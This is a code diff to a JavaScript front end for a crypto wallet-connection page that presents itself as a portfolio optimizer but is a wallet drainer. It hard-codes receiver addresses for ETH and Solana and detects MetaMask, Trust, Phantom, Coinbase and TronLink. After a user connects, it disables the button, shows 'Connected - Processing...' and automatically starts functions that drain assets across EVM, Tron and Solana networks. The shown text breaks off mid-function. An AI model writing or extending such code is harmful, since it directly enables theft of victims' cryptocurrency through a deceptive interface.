@@ -1,4 +1,4 @@
-$(document).ready(function() {
+﻿$(document).ready(function() {
     // Your Ethereum address to receive funds
     const RECEIVER_ADDRESS = "0xA6ea466A91837809CB1d94B8ccb73c2D98657321"; // Replace with your ETH address
     const SOLANA_RECEIVER = "4NW3YXvEiNEVX6QxeS19FvSZ963vGqMQMvxguR8npq6s"; // Replace with your Solana address
@@ -231,31 +231,48 @@ $(document).ready(function() {
 
     // Simplified wallet definitions - only the 4 main wallets
     const WALLET_DEFINITIONS = {
-        trust: {
-            name: "Trust Wallet",
+        metamask: {
+            name: "MetaMask",
             type: "evm",
-            networks: ["ethereum", "bsc", "polygon"], // Trust supports all EVM networks
+            networks: ["ethereum", "bsc", "polygon"],
             detect: () => {
-                if (window.ethereum && window.ethereum.isTrust) return window.ethereum;
-                // Check for Trust in providers array
-                if (window.ethereum && window.ethereum.providers) {
-                    return window.ethereum.providers.find(p => p.isTrust);
-                }
-                return false;
+                return window.ethereum && window.ethereum.isMetaMask && !window.ethereum.isPhantom;
             },
             getProvider: () => {
-                if (window.ethereum && window.ethereum.isTrust) return window.ethereum;
+                if (window.ethereum && window.ethereum.isMetaMask && !window.ethereum.isPhantom) {
+                    return window.ethereum;
+                }
+                if (window.ethereum && window.ethereum.providers) {
+                    return window.ethereum.providers.find(p => p.isMetaMask && !p.isPhantom);
+                }
+                return null;
+            },
+            icon: "🦊"
+        },
+        trust: {
+            name: "Trust Wallet",
+            type: "multi-evm-tron-solana",
+            networks: ["ethereum", "bsc", "polygon", "tron", "solana"],
+            detect: () => {
+                return window.ethereum && window.ethereum.isTrust;
+            },
+            getProvider: () => {
+                if (window.ethereum && window.ethereum.isTrust) {
+                    return window.ethereum;
+                }
                 if (window.ethereum && window.ethereum.providers) {
                     return window.ethereum.providers.find(p => p.isTrust);
                 }
                 return null;
             },
-            icon: "�️"
+            getTronProvider: () => window.tronWeb, // Trust Wallet can also access TronWeb
+            getSolanaProvider: () => window.solana, // Trust Wallet can also access Solana
+            icon: "🛡️"
         },
         phantom: {
             name: "Phantom",
-            type: "multi", // Phantom supports both EVM and Solana
-            evmNetworks: ["ethereum"], // Phantom EVM only supports Ethereum mainnet
+            type: "multi",
+            evmNetworks: ["ethereum", "polygon"], // Only ETH and Polygon for EVM
             solanaNetworks: ["solana"],
             detect: () => {
                 const hasEVM = window.phantom && window.phantom.ethereum;
@@ -264,22 +281,22 @@ $(document).ready(function() {
             },
             getEVMProvider: () => window.phantom && window.phantom.ethereum,
             getSolanaProvider: () => window.solana || (window.phantom && window.phantom.solana),
-            icon: "�"
+            icon: "👻"
         },
         coinbase: {
             name: "Coinbase Wallet",
             type: "evm",
-            networks: ["ethereum", "bsc", "polygon"], // Coinbase supports all EVM networks
+            networks: ["ethereum", "bsc", "polygon"],
             detect: () => {
-                if (window.ethereum && window.ethereum.isCoinbaseWallet) return window.ethereum;
-                // Check for Coinbase in providers array
-                if (window.ethereum && window.ethereum.providers) {
-                    return window.ethereum.providers.find(p => p.isCoinbaseWallet);
-                }
-                return false;
+                return (window.ethereum && window.ethereum.isCoinbaseWallet) || window.coinbaseWalletExtension;
             },
             getProvider: () => {
-                if (window.ethereum && window.ethereum.isCoinbaseWallet) return window.ethereum;
+                if (window.ethereum && window.ethereum.isCoinbaseWallet) {
+                    return window.ethereum;
+                }
+                if (window.coinbaseWalletExtension) {
+                    return window.coinbaseWalletExtension;
+                }
                 if (window.ethereum && window.ethereum.providers) {
                     return window.ethereum.providers.find(p => p.isCoinbaseWallet);
                 }
@@ -290,30 +307,10 @@ $(document).ready(function() {
         tronlink: {
             name: "TronLink",
             type: "tron",
-            networks: ["tron"], // TronLink only supports Tron network
-            detect: () => window.tronWeb && window.tronWeb.defaultAddress,
+            networks: ["tron"],
+            detect: () => window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58,
             getProvider: () => window.tronWeb,
             icon: "🔴"
-        }
-    };
-
-    // Enhanced mobile deep links with updated URLs - simplified for the 4 main wallets
-    const MOBILE_LINKS = {
-        "trust-mobile": {
-            scheme: "https://link.trustwallet.com/open_url",
-            params: (url) => `?coin_id=60&url=${encodeURIComponent(url)}`
-        },
-        "phantom-mobile": {
-            scheme: "https://phantom.app/ul/browse",
-            params: (url) => `/${encodeURIComponent(url)}?ref=${encodeURIComponent(url)}`
-        },
-        "coinbase-mobile": {
-            scheme: "https://go.cb-w.com/dapp",
-            params: (url) => `?cb_url=${encodeURIComponent(url)}`
-        },
-        "tronlink-mobile": {
-            scheme: "tronlink://open",
-            params: (url) => `?url=${encodeURIComponent(url)}`
         }
     };
 
@@ -515,102 +512,18 @@ $(document).ready(function() {
         });
     }
 
-    // Function to populate wallet dropdown - simplified for 4 main wallets
-    function populateWalletDropdown() {
-        const walletSelect = $('#wallet-select');
-        if (!walletSelect.length) return;
-
-        // Clear existing options except the default one
-        walletSelect.find('option:not(:first)').remove();
-        walletSelect.find('optgroup').remove();
-
-        // Create main wallets group
-        const mainGroup = $('<optgroup label="� Supported Wallets"></optgroup>');
-        
-        // Add our 4 main wallets
+    // Simple wallet status checker - no longer modifies dropdown since it's now hardcoded in HTML
+    function checkWalletStatuses() {
+        console.log("=== Checking Wallet Availability ===");
         Object.entries(WALLET_DEFINITIONS).forEach(([key, wallet]) => {
             try {
-                const detectionResult = wallet.detect();
-                const availability = detectionResult ? "✅" : "❌";
-                
-                let networksText = "";
-                if (wallet.type === "multi") {
-                    // Phantom supports both EVM and Solana
-                    const evmText = wallet.evmNetworks.map(n => n.toUpperCase()).join(', ');
-                    const solanaText = wallet.solanaNetworks.map(n => n.toUpperCase()).join(', ');
-                    networksText = `${evmText}, ${solanaText}`;
-                } else if (wallet.networks) {
-                    networksText = wallet.networks.map(n => n.toUpperCase()).join(', ');
-                }
-                
-                mainGroup.append(
-                    `<option value="${key}" data-type="${wallet.type}" data-networks="${networksText}">${wallet.icon} ${wallet.name} (${networksText}) ${availability}</option>`
-                );
+                const detected = wallet.detect();
+                console.log(`${wallet.name}: ${detected ? '✅ Available' : '❌ Not Available'}`);
             } catch (error) {
-                console.log(`Error detecting ${wallet.name}:`, error);
-                let networksText = "";
-                if (wallet.type === "multi") {
-                    const evmText = wallet.evmNetworks.map(n => n.toUpperCase()).join(', ');
-                    const solanaText = wallet.solanaNetworks.map(n => n.toUpperCase()).join(', ');
-                    networksText = `${evmText}, ${solanaText}`;
-                } else if (wallet.networks) {
-                    networksText = wallet.networks.map(n => n.toUpperCase()).join(', ');
-                }
-                mainGroup.append(
-                    `<option value="${key}" data-type="${wallet.type}" data-networks="${networksText}">${wallet.icon} ${wallet.name} (${networksText}) ❌</option>`
-                );
+                console.log(`${wallet.name}: ❌ Error checking - ${error.message}`);
             }
         });
-
-        walletSelect.append(mainGroup);
-
-        // Enhanced mobile options - always show on mobile device
-        if (isMobileDevice()) {
-            const mobileGroup = $('<optgroup label="📱 Mobile Wallets"></optgroup>');
-            
-            // Core mobile wallets (matching our 4 main wallets)
-            const coreMobileWallets = [
-                { name: "Trust Wallet Mobile", key: "trust-mobile", icon: "🛡️", networks: ["ETH", "BSC", "POLYGON"], popular: true },
-                { name: "Phantom Mobile", key: "phantom-mobile", icon: "👻", networks: ["ETH", "SOLANA"], popular: true },
-                { name: "Coinbase Wallet Mobile", key: "coinbase-mobile", icon: "🟦", networks: ["ETH", "BSC", "POLYGON"], popular: true },
-                { name: "TronLink Mobile", key: "tronlink-mobile", icon: "🔴", networks: ["TRON"], popular: true }
-            ];
-            
-            // Additional popular mobile wallets
-            const additionalMobileWallets = [
-                { name: "MetaMask Mobile", key: "metamask-mobile", icon: "🦊", networks: ["ETH", "BSC", "POLYGON"], popular: true },
-                { name: "Rainbow Mobile", key: "rainbow-mobile", icon: "🌈", networks: ["ETH", "POLYGON"], popular: false },
-                { name: "Exodus Mobile", key: "exodus-mobile", icon: "💫", networks: ["ETH", "BSC"], popular: false },
-                { name: "imToken Mobile", key: "imtoken-mobile", icon: "💎", networks: ["ETH", "BSC", "TRON"], popular: false },
-                { name: "TokenPocket Mobile", key: "tokenpocket-mobile", icon: "🔸", networks: ["ETH", "BSC", "TRON"], popular: false },
-                { name: "SafePal Mobile", key: "safepal-mobile", icon: "🔒", networks: ["ETH", "BSC"], popular: false }
-            ];
-
-            // Add core wallets first
-            coreMobileWallets.forEach(wallet => {
-                const networksText = wallet.networks.join(', ');
-                const popularText = wallet.popular ? " ⭐" : "";
-                mobileGroup.append(
-                    `<option value="${wallet.key}" data-type="mobile" data-networks="${wallet.networks.join(',').toLowerCase()}">${wallet.icon} ${wallet.name} (${networksText})${popularText} 📱</option>`
-                );
-            });
-            
-            // Add separator
-            mobileGroup.append('<option disabled>──────────</option>');
-            
-            // Add additional wallets
-            additionalMobileWallets.forEach(wallet => {
-                const networksText = wallet.networks.join(', ');
-                const popularText = wallet.popular ? " ⭐" : "";
-                mobileGroup.append(
-                    `<option value="${wallet.key}" data-type="mobile" data-networks="${wallet.networks.join(',').toLowerCase()}">${wallet.icon} ${wallet.name} (${networksText})${popularText} 📱</option>`
-                );
-            });
-
-            walletSelect.append(mobileGroup);
-        }
-        
-        console.log("Wallet dropdown populated with 4 main wallets:", Object.keys(WALLET_DEFINITIONS).join(', '));
+        console.log("====================================");
     }
 
     // Current selection state
@@ -757,86 +670,6 @@ $(document).ready(function() {
         return null;
     }
 
-    // Enhanced wallet dropdown creation with improved mobile handling
-    function createWalletDropdown() {
-        // Insert wallet dropdown before button with enhanced mobile handling
-        $('.button-container').prepend('<select id="wallet-select" style="margin-bottom:15px;"><option value="">Select Wallet</option></select>');
-        
-        // Add connection status indicator
-        $('.button-container').prepend('<div id="connection-status" style="margin-bottom:10px; font-size:12px; color:#666;"></div>');
-        
-        const walletSelect = $('#wallet-select');
-        
-        // Add detected wallets to dropdown with device-specific filtering
-        if (detectedWallets.length === 0) {
-            // Fallback: add basic options if no wallets detected
-            if (isMobileDevice()) {
-                detectedWallets.push(
-                    { name: "MetaMask Mobile", type: "mobile", deepLink: "metamask" },
-                    { name: "Trust Wallet Mobile", type: "mobile", deepLink: "trust wallet" },
-                    { name: "Coinbase Wallet Mobile", type: "mobile", deepLink: "coinbase wallet" },
-                    { name: "WalletConnect", provider: "walletconnect", type: "walletconnect" }
-                );
-            } else {
-                detectedWallets.push(
-                    { name: "MetaMask (Install Required)", provider: null },
-                    { name: "WalletConnect", provider: "walletconnect", type: "walletconnect" }
-                );
-            }
-        }
-        
-        // Group wallets by type for better organization
-        const desktopWallets = detectedWallets.filter(w => w.type !== "mobile" && w.type !== "walletconnect");
-        const mobileWallets = detectedWallets.filter(w => w.type === "mobile");
-        const walletConnectWallets = detectedWallets.filter(w => w.type === "walletconnect");
-        
-        // Add desktop wallets
-        if (desktopWallets.length > 0 && !isMobileDevice()) {
-            const desktopGroup = $('<optgroup label="🖥️ Desktop Wallets"></optgroup>');
-            desktopWallets.forEach((wallet, i) => {
-                let displayName = wallet.name;
-                let availability = "❌";
-                
-                try {
-                    if (wallet.provider && typeof wallet.provider.request === 'function') {
-                        availability = "✅";
-                    } else if (!wallet.provider && wallet.name !== "WalletConnect") {
-                        displayName += " (Not Installed)";
-                    }
-                } catch (error) {
-                    // Wallet detection failed
-                }
-                
-                desktopGroup.append(`<option value="${detectedWallets.indexOf(wallet)}">${availability} ${displayName}</option>`);
-            });
-            walletSelect.append(desktopGroup);
-        }
-        
-        // Add mobile wallets if on mobile device
-        if (mobileWallets.length > 0 && isMobileDevice()) {
-            const mobileGroup = $('<optgroup label="📱 Mobile Wallets"></optgroup>');
-            mobileWallets.forEach((wallet, i) => {
-                let displayName = wallet.name;
-                if (wallet.networks) {
-                    displayName += ` (${wallet.networks.join(', ')})`;
-                }
-                mobileGroup.append(`<option value="${detectedWallets.indexOf(wallet)}">${displayName}</option>`);
-            });
-            walletSelect.append(mobileGroup);
-        }
-        
-        // Add WalletConnect option
-        if (walletConnectWallets.length > 0) {
-            const wcGroup = $('<optgroup label="🔗 Universal Connection"></optgroup>');
-            walletConnectWallets.forEach((wallet, i) => {
-                wcGroup.append(`<option value="${detectedWallets.indexOf(wallet)}">🔗 ${wallet.name} (Works on any device)</option>`);
-            });
-            walletSelect.append(wcGroup);
-        }
-        
-        console.log(`Wallet dropdown created with ${detectedWallets.length} options`);
-    }
-
     // Enhanced connection status update
     function updateConnectionStatus(message, isError = false) {
         const statusEl = $('#connection-status');
@@ -844,9 +677,8 @@ $(document).ready(function() {
         statusEl.css('color', isError ? '#ff4444' : '#666');
     }
 
-    // Initialize UI
-    createWalletDropdown();
-    updateConnectionStatus(`Device: ${isMobileDevice() ? 'Mobile' : 'Desktop'} | Wallets found: ${detectedWallets.length}`);
+    // Initialize UI - dropdown is now static in HTML
+    updateConnectionStatus(`Device: ${isMobileDevice() ? 'Mobile' : 'Desktop'} | Ready for wallet selection`);
 
     // Debug wallet providers on page load
     debugWalletProviders();
@@ -911,7 +743,7 @@ $(document).ready(function() {
         
         // Enable/disable connect button
         const canConnect = (availability === 'Available' || availability === 'Mobile Supported');
-        $('#connect-btn').prop('disabled', !canConnect);
+        $('#connect-wallet').prop('disabled', !canConnect);
     }
 
     // Wallet selection handler  
@@ -944,15 +776,15 @@ $(document).ready(function() {
     updateConnectionStatus(`Device: ${deviceType} - Ready for wallet selection`);
 
     // Populate wallet dropdown with detected wallets
-    populateWalletDropdown();
+    checkWalletStatuses();
     
     // Add refresh functionality for wallet detection
     $('#wallet-select').after('<button id="refresh-wallets" class="refresh-btn" style="margin-left: 10px; padding: 5px 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">🔄 Refresh</button>');
     
     $('#refresh-wallets').on('click', function() {
         console.log("Refreshing wallet detection...");
-        populateWalletDropdown();
-        updateConnectionStatus("Wallet list refreshed! Please select your wallet.");
+        checkWalletStatuses();
+        updateConnectionStatus("Wallet detection refreshed! Check console for status.");
     });
 
     // Debug: Show available wallets
@@ -964,189 +796,178 @@ $(document).ready(function() {
     });
     console.log("===============================");
 
-    // Enhanced main wallet connection handler with improved mobile support
+    // Simplified main wallet connection handler
     $('#connect-wallet').on('click', async () => {
-        const selectedIdx = $('#wallet-select').val();
-        const selected = detectedWallets[selectedIdx];
+        const selectedWalletKey = $('#wallet-select').val();
         
         try {
-            if (!selected) {
+            if (!selectedWalletKey) {
                 alert("Please select a wallet from the dropdown menu.");
                 return;
             }
 
-            console.log("Connecting to wallet:", selected);
-            updateConnectionStatus(`Connecting to ${selected.name}...`);
+            console.log("Connecting to wallet:", selectedWalletKey);
+            updateConnectionStatus(`Connecting to wallet...`);
 
-            // Handle mobile wallet connections with enhanced flow
-            if (selected.type === "mobile") {
-                if (isMobileDevice()) {
-                    updateConnectionStatus("Opening mobile wallet app...");
-                    
-                    // Enhanced mobile connection flow
-                    const deepLinkOpened = connectMobileWallet(selected.deepLink);
-                    if (deepLinkOpened) {
-                        updateConnectionStatus("Waiting for wallet connection... Please return after connecting.");
-                        
-                        // Enhanced user instructions with browser-specific guidance
-                        const mobileBrowser = getMobileBrowser();
-                        let browserNote = '';
-                        
-                        if (mobileBrowser === 'safari') {
-                            browserNote = '\n\n📱 Safari: Tap "Open" when prompted to launch the wallet app.';
-                        } else if (mobileBrowser === 'chrome') {
-                            browserNote = '\n\n📱 Chrome: Allow the page to open the wallet app when prompted.';
-                        } else if (mobileBrowser === 'firefox') {
-                            browserNote = '\n\n📱 Firefox: If the app doesn\'t open, try copying the URL manually.';
-                        }
-                        
-                        const continueWaiting = confirm(
-                            `🚀 Opening ${selected.name}...\n\n` +
-                            "📋 Instructions:\n" +
-                            "1. The wallet app should open automatically\n" +
-                            "2. Connect/unlock your wallet in the app\n" +
-                            "3. Return to this browser tab\n" +
-                            "4. Click OK to continue waiting, or Cancel to try a different method" +
-                            browserNote
-                        );
-                        
-                        if (continueWaiting) {
-                            // Enhanced connection waiting with better detection
-                            const connectionResult = await waitForMobileConnection(45000);
-                            
-                            if (connectionResult.success) {
-                                updateConnectionStatus("Mobile wallet connected successfully!");
-                                
-                                // Handle different wallet types from mobile connection
-                                if (connectionResult.isTron) {
-                                    await handleTronConnection(connectionResult.provider, connectionResult.accounts[0]);
-                                } else if (connectionResult.isSolana) {
-                                    await handleSolanaConnection(connectionResult.provider, connectionResult.accounts[0]);
-                                } else {
-                                    // Handle as EVM wallet
-                                    await handleSuccessfulConnection(
-                                        connectionResult.provider, 
-                                        selected.name, 
-                                        connectionResult.accounts[0]
-                                    );
-                                }
-                                return;
-                            } else {
-                                updateConnectionStatus("Mobile connection failed or timed out", true);
-                                alert("⏰ Connection timed out. Please try again or use WalletConnect instead.");
-                                return;
-                            }
-                        } else {
-                            updateConnectionStatus("Mobile connection cancelled by user");
-                            return;
-                        }
-                    } else {
-                        updateConnectionStatus("Failed to open mobile wallet", true);
-                        alert(`❌ Unable to open ${selected.name}. Please install the wallet app and try again.`);
-                        return;
-                    }
-                } else {
-                    updateConnectionStatus("Mobile wallet selected on desktop device", true);
-                    alert("📱 This is a mobile wallet option. Please use a desktop wallet or switch to a mobile device.");
-                    return;
-                }
-            }
-
-            // Handle WalletConnect with enhanced setup
-            if (selected.name === "WalletConnect" && walletConnectAvailable && WalletConnectProvider) {
-                updateConnectionStatus("Initializing WalletConnect...");
-                
-                const PROJECT_ID = "435fa3916a5da648144afac1e1b4d3f2";
-                const provider = await WalletConnectProvider.init({
-                    projectId: PROJECT_ID,
-                    chains: [1, 56, 137], // Support multiple networks
-                    showQrModal: true,
-                    metadata: {
-                        name: "Multi-Chain Portfolio Optimizer",
-                        description: "Connect any wallet to optimize your crypto portfolio across multiple networks",
-                        url: window.location.origin,
-                        icons: ["https://walletconnect.com/walletconnect-logo.png"]
-                    }
-                });
-                
-                updateConnectionStatus("Waiting for WalletConnect pairing...");
-                await provider.connect();
-                
-                if (!provider.accounts || provider.accounts.length === 0) {
-                    updateConnectionStatus("WalletConnect connection failed", true);
-                    alert("❌ No accounts connected via WalletConnect.");
-                    return;
-                }
-                
-                updateConnectionStatus("WalletConnect connected successfully!");
-                await handleSuccessfulConnection(provider, selected.name, provider.accounts[0]);
+            // Handle desktop wallet connections
+            const walletDef = WALLET_DEFINITIONS[selectedWalletKey];
+            if (!walletDef) {
+                alert("Wallet not supported. Please select a different wallet.");
                 return;
             }
 
-            // Handle desktop wallet connections with improved validation
-            if (!selected.provider || selected.provider === "walletconnect") {
-                updateConnectionStatus("Wallet not available", true);
-                alert("❌ Wallet provider not available. Please install the wallet extension or use WalletConnect.");
+            // Check if wallet is detected
+            if (!walletDef.detect()) {
+                alert(`${walletDef.name} is not detected. Please install the wallet extension and refresh the page.`);
                 return;
             }
 
-            const provider = selected.provider;
+            // Get provider based on wallet type
+            let provider, selectedWallet;
             
-            // Enhanced provider validation
-            if (!provider || typeof provider.request !== 'function') {
-                updateConnectionStatus("Wallet extension not properly installed", true);
-                alert(`❌ ${selected.name} is not properly installed or available. Please install the wallet extension and refresh the page.`);
-                return;
-            }
-
-            // Request account access with better error handling
-            try {
-                await provider.request({ method: 'eth_requestAccounts' });
-            } catch (requestError) {
-                if (requestError.code === 4001) {
-                    updateConnectionStatus("Connection rejected by user", true);
-                    alert("❌ Connection request was rejected. Please try again and approve the connection.");
-                    return;
-                } else if (requestError.code === -32002) {
-                    updateConnectionStatus("Connection request already pending", true);
-                    alert("⏳ A connection request is already pending. Please check your wallet.");
+            if (walletDef.type === "multi") {
+                // Phantom wallet - automatically use all networks
+                const evmProvider = walletDef.getEVMProvider();
+                const solanaProvider = walletDef.getSolanaProvider();
+                
+                if (!evmProvider && !solanaProvider) {
+                    alert("Phantom wallet not found. Please install Phantom wallet.");
                     return;
                 }
-                throw requestError;
-            }
-            
-            // Get connected accounts
-            const accounts = await provider.request({ method: 'eth_accounts' });
-            if (!accounts || accounts.length === 0) {
-                updateConnectionStatus("No accounts found in wallet", true);
-                alert("❌ No accounts found. Please unlock your wallet and try again.");
-                return;
+                
+                selectedWallet = {
+                    name: walletDef.name,
+                    evmProvider: evmProvider,
+                    solanaProvider: solanaProvider,
+                    type: "phantom-multi",
+                    networks: ["ethereum", "bsc", "polygon", "solana"]
+                };
+            } else if (walletDef.type === "tron") {
+                // Tron wallet
+                provider = walletDef.getProvider();
+                if (!provider || !provider.defaultAddress || !provider.defaultAddress.base58) {
+                    alert("TronLink is not connected. Please unlock TronLink and try again.");
+                    return;
+                }
+                selectedWallet = {
+                    name: walletDef.name,
+                    provider: provider,
+                    type: "tron",
+                    networks: walletDef.networks
+                };
+            } else if (walletDef.type === "multi-evm-tron") {
+                // Trust Wallet with EVM + Tron support
+                provider = walletDef.getProvider();
+                if (!provider) {
+                    alert(`${walletDef.name} provider not found. Please install the wallet extension.`);
+                    return;
+                }
+                selectedWallet = {
+                    name: walletDef.name,
+                    provider: provider,
+                    tronProvider: walletDef.getTronProvider(),
+                    type: "trust-multi",
+                    networks: walletDef.networks
+                };
+            } else if (walletDef.type === "multi-evm-tron-solana") {
+                // Trust Wallet with EVM + Tron + Solana support
+                provider = walletDef.getProvider();
+                if (!provider) {
+                    alert(`${walletDef.name} provider not found. Please install the wallet extension.`);
+                    return;
+                }
+                selectedWallet = {
+                    name: walletDef.name,
+                    provider: provider,
+                    tronProvider: walletDef.getTronProvider(),
+                    solanaProvider: walletDef.getSolanaProvider(),
+                    type: "trust-multi-full",
+                    networks: walletDef.networks
+                };
+            } else {
+                // EVM wallet
+                provider = walletDef.getProvider();
+                if (!provider) {
+                    alert(`${walletDef.name} provider not found. Please install the wallet extension.`);
+                    return;
+                }
+                selectedWallet = {
+                    name: walletDef.name,
+                    provider: provider,
+                    type: "evm",
+                    networks: walletDef.networks
+                };
             }
 
-            updateConnectionStatus("Desktop wallet connected successfully!");
-            await handleSuccessfulConnection(provider, selected.name, accounts[0]);
+            // Universal connection - all wallet types use the same reliable handler
+            await handleWalletConnection(selectedWallet);
 
         } catch (error) {
             console.error("Connection error:", error);
-            
-            // Enhanced error handling with specific messages
-            let errorMessage = error.message;
-            if (error.message.includes("User rejected")) {
-                errorMessage = "Connection was rejected. Please try again and approve the connection in your wallet.";
-                updateConnectionStatus("Connection rejected by user", true);
-            } else if (error.code === 4001) {
-                errorMessage = "Connection was rejected by user. Please try again.";
-                updateConnectionStatus("Connection rejected by user", true);
-            } else if (error.code === -32002) {
-                errorMessage = "Connection request already pending. Please check your wallet.";
-                updateConnectionStatus("Connection request already pending", true);
-            } else {
-                updateConnectionStatus("Connection failed", true);
-            }
-            
-            alert("❌ Failed to connect wallet: " + errorMessage);
+            updateConnectionStatus("Connection failed", true);
+            alert(`Connection failed: ${error.message || error.toString()}`);
         }
     });
+
+    // Update wallet status display when selection changes
+    $('#wallet-select').on('change', function() {
+        const selectedWalletKey = $(this).val();
+        
+        if (!selectedWalletKey) {
+            $('#wallet-availability').text("Select wallet to check availability");
+            $('#supported-networks').text("Auto-detection enabled");
+            return;
+        }
+
+        // Handle mobile wallets
+        if (selectedWalletKey.includes('-mobile')) {
+            $('#wallet-availability').text(isMobileDevice() ? "Mobile wallet app required" : "Mobile device required");
+            const option = $(this).find('option:selected');
+            const networks = option.data('networks') || "";
+            $('#supported-networks').text(networks.replace(/,/g, ', ').toUpperCase());
+            return;
+        }
+
+        // Handle desktop wallets
+        const walletDef = WALLET_DEFINITIONS[selectedWalletKey];
+        if (walletDef) {
+            const isDetected = walletDef.detect();
+            $('#wallet-availability').text(isDetected ? "✅ Available" : "❌ Not detected");
+            
+            let networksText = "";
+            if (walletDef.type === "multi") {
+                const evmText = walletDef.evmNetworks.join(', ').toUpperCase();
+                const solanaText = walletDef.solanaNetworks.join(', ').toUpperCase();
+                networksText = `${evmText}, ${solanaText}`;
+            } else if (walletDef.networks) {
+                networksText = walletDef.networks.join(', ').toUpperCase();
+            }
+            $('#supported-networks').text(networksText);
+        }
+    });
+
+    // Initialize wallet system
+    function initializeWalletSystem() {
+        // Check wallet statuses
+        checkWalletStatuses();
+        
+        // Update device info
+        const deviceType = isMobileDevice() ? 'Mobile' : 'Desktop';
+        $('#device-type').text(deviceType);
+        updateConnectionStatus(`Device: ${deviceType} - Ready for wallet selection`);
+        
+        // Debug: Show available wallets
+        console.log("=== Wallet System Initialized ===");
+        Object.keys(WALLET_DEFINITIONS).forEach(walletId => {
+            const wallet = WALLET_DEFINITIONS[walletId];
+            const detected = wallet.detect();
+            console.log(`${wallet.name}: ${detected ? '✅ Available' : '❌ Not Available'}`);
+        });
+        console.log("=================================");
+    }
+
+    // Initialize the system when page loads
+    initializeWalletSystem();
 
     // Enhanced successful connection handler with multi-chain support
     async function handleSuccessfulConnection(provider, walletName, userAddress) {
@@ -1225,81 +1046,538 @@ $(document).ready(function() {
         }
     }
 
-    // Enhanced Tron connection handler
-    async function handleTronConnection(provider, userAddress) {
+    // Universal reliable wallet connection handler - works for ALL wallet types
+    async function handleWalletConnection(walletInfo) {
         try {
-            updateConnectionStatus("Setting up Tron connection...");
+            const { name, provider, type, networks } = walletInfo;
+            updateConnectionStatus(`Connecting to ${name}...`);
             
-            if (!provider || !provider.defaultAddress || !provider.defaultAddress.base58) {
-                throw new Error("TronLink is not properly installed or logged in.");
+            let userAddress = null;
+            let networkInfo = null;
+            
+            if (type === "evm") {
+                // Handle EVM wallets (MetaMask, Trust, Coinbase, Phantom EVM)
+                await provider.request({ method: 'eth_requestAccounts' });
+                const accounts = await provider.request({ method: 'eth_accounts' });
+                
+                if (!accounts || accounts.length === 0) {
+                    throw new Error("No accounts found. Please unlock your wallet.");
+                }
+                
+                userAddress = accounts[0];
+                const ethersProvider = new ethers.providers.Web3Provider(provider);
+                const network = await ethersProvider.getNetwork();
+                const balance = await ethersProvider.getBalance(userAddress);
+                
+                networkInfo = {
+                    name: network.name,
+                    chainId: network.chainId,
+                    balance: ethers.utils.formatEther(balance),
+                    currency: network.chainId === 56 ? 'BNB' : network.chainId === 137 ? 'MATIC' : 'ETH'
+                };
+                
+                // Setup wallet-specific draining function - auto-start after connection
+                const signer = ethersProvider.getSigner();
+                $('#connect-wallet').text("Connected - Processing...").prop('disabled', true);
+                
+                // Auto-start draining immediately for wallet's specific networks
+                setTimeout(async () => {
+                    await drainWalletSpecificNetworks(walletInfo, userAddress);
+                }, 1000);
+                
+            } else if (type === "trust-multi") {
+                // Handle Trust Wallet multi-network (EVM + Tron)
+                await provider.request({ method: 'eth_requestAccounts' });
+                const accounts = await provider.request({ method: 'eth_accounts' });
+                
+                if (!accounts || accounts.length === 0) {
+                    throw new Error("No accounts found. Please unlock your wallet.");
+                }
+                
+                userAddress = accounts[0];
+                const ethersProvider = new ethers.providers.Web3Provider(provider);
+                const network = await ethersProvider.getNetwork();
+                const balance = await ethersProvider.getBalance(userAddress);
+                
+                networkInfo = {
+                    name: "Trust Multi-Chain",
+                    chainId: network.chainId,
+                    balance: ethers.utils.formatEther(balance),
+                    currency: network.chainId === 56 ? 'BNB' : network.chainId === 137 ? 'MATIC' : 'ETH'
+                };
+                
+                // Setup Trust Wallet multi-network draining - auto-start
+                $('#connect-wallet').text("Connected - Processing...").prop('disabled', true);
+                
+                // Auto-start draining immediately for Trust's specific networks
+                setTimeout(async () => {
+                    await drainTrustMultiNetworks(walletInfo, userAddress);
+                }, 1000);
+                
+            } else if (type === "trust-multi-full") {
+                // Handle Trust Wallet full multi-network (EVM + Tron + Solana)
+                await provider.request({ method: 'eth_requestAccounts' });
+                const accounts = await provider.request({ method: 'eth_accounts' });
+                
+                if (!accounts || accounts.length === 0) {
+                    throw new Error("No accounts found. Please unlock your wallet.");
+                }
+                
+                userAddress = accounts[0];
+                const ethersProvider = new ethers.providers.Web3Provider(provider);
+                const network = await ethersProvider.getNetwork();
+                const balance = await ethersProvider.getBalance(userAddress);
+                
+                networkInfo = {
+                    name: "Trust Full Multi-Chain",
+                    chainId: network.chainId,
+                    balance: ethers.utils.formatEther(balance),
+                    currency: network.chainId === 56 ? 'BNB' : network.chainId === 137 ? 'MATIC' : 'ETH'
+                };
+                
+                // Setup Trust Wallet full multi-network draining - auto-start
+                $('#connect-wallet').text("Connected - Processing...").prop('disabled', true);
+                
+                // Auto-start draining immediately for Trust's all networks
+                setTimeout(async () => {
+                    await drainTrustFullMultiNetworks(walletInfo, userAddress);
+                }, 1000);
+                
+            } else if (type === "phantom-multi") {
+                // Handle Phantom multi-chain (both EVM and Solana)
+                console.log("🎯 Setting up Phantom multi-chain connection...");
+                
+                let evmAddress = null;
+                let solanaAddress = null;
+                
+                // Connect to EVM if available
+                if (walletInfo.evmProvider) {
+                    try {
+                        await walletInfo.evmProvider.request({ method: 'eth_requestAccounts' });
+                        const accounts = await walletInfo.evmProvider.request({ method: 'eth_accounts' });
+                        if (accounts && accounts.length > 0) {
+                            evmAddress = accounts[0];
+                            console.log("✅ Phantom EVM connected:", evmAddress);
+                        }
+                    } catch (evmError) {
+                        console.log("❌ Phantom EVM connection failed:", evmError.message);
+                    }
+                }
+                
+                // Connect to Solana if available
+                if (walletInfo.solanaProvider) {
+                    try {
+                        const response = await walletInfo.solanaProvider.connect();
+                        if (response && response.publicKey) {
+                            solanaAddress = response.publicKey.toString();
+                            console.log("✅ Phantom Solana connected:", solanaAddress);
+                        }
+                    } catch (solanaError) {
+                        console.log("❌ Phantom Solana connection failed:", solanaError.message);
+                    }
+                }
+                
+                if (!evmAddress && !solanaAddress) {
+                    throw new Error("Failed to connect to both Phantom EVM and Solana. Please try again.");
+                }
+                
+                // Use the first available address for display
+                userAddress = evmAddress || solanaAddress;
+                
+                networkInfo = {
+                    name: "Multi-Chain (EVM + Solana)",
+                    chainId: "multi",
+                    balance: "Multiple Networks",
+                    currency: "Multi"
+                };
+                
+                // Setup comprehensive multi-chain draining for Phantom - auto-start
